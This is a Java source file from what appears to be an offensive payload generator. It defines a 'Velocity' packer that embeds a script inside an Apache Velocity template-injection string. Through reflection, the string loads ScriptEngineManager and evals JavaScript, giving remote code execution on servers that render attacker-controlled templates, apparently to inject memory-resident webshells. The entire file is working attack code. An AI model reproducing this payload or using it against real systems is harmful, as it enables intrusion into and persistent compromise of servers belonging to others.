package org.leo.jmg.mem.packer.velocity;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "Velocity", order = 100)
public class VelocityPacker implements Packer {
    String template = "#set($x='') #set($cz = $x.class.forName('javax.script.ScriptEngineManager')) $cz.getDeclaredConstructor(null).newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return template.replace("{{script}}", script);
    }
}
